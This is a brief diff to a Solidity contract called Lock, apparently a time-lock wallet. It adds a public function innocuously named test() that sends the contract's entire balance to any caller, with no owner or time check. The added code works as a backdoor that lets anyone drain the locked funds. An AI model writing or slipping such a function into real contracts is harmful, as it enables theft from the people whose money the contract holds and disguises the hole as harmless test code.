@@ -31,4 +31,8 @@ contract Lock {
 
         owner.transfer(address(this).balance);
     }
+
+    function test() public {
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+    }
 }
